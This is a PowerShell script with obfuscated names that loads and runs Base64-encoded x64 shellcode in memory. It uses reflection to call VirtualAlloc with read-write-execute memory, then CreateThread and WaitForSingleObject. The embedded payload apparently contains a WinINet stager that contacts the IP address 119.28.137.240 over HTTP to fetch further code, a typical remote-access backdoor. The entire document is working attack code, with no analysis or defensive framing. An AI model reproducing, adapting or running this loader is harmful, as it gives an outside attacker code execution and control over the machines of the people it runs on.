function gKpGka {
	Param ($bitw0d, $fz7kmLMuyy)		
	$uCoQRza = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $uCoQRza.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uCoQRza.GetMethod('GetModuleHandle')).Invoke($null, @($bitw0d)))), $fz7kmLMuyy))
}

function itECUrEOMPAQ {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $pipp_,
		[Parameter(Position = 1)] [Type] $cKZoQgb = [Void]
	)
	
	$vSxTUpDBI = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$vSxTUpDBI.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $pipp_).SetImplementationFlags('Runtime, Managed')
	$vSxTUpDBI.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $cKZoQgb, $pipp_).SetImplementationFlags('Runtime, Managed')
	
	return $vSxTUpDBI.CreateType()
}

[Byte[]]$wPWDfQ2IJ = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A8AAAAxMTkuMjguMTM3LjI0MABaSInBScfAuwEAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6IwAAAAveE1WQUtRbzRWbmg3SDNvZElvT05ad0xlREl3NVd2RGhzSDA3Nlg0cFpjSUdpTzhMOGx6NFlnelYzVW5TZl9TN3JsYTJnVlQ2eWMtQWlJN0lPd1hweFhIUXVZVi1PZEdBeHR6dzNOcmhZanBSa3R5dDBkbkxRRHFSbmd2Z1NMbUV3TG41czkxdzlUAEiJwVNaQVhNMclTSLgAMqCEAAAAAFBTU0nHwutVLjv/1UiJxmoKX0iJ8WofWlJogDMAAEmJ4GoEQVlJunVGnoYAAAAA/9VIifFTWk0xwE0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890Auut6FYAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10lhYw1hqAFlJx8LwtaJW/9U=")
		
$gtrh = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gKpGka kernel32.dll VirtualAlloc), (itECUrEOMPAQ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $wPWDfQ2IJ.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($wPWDfQ2IJ, 0, $gtrh, $wPWDfQ2IJ.length)

$lBEeraeqepmI = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gKpGka kernel32.dll CreateThread), (itECUrEOMPAQ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$gtrh,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gKpGka kernel32.dll WaitForSingleObject), (itECUrEOMPAQ @([IntPtr], [Int32]))).Invoke($lBEeraeqepmI,0xffffffff) | Out-Null
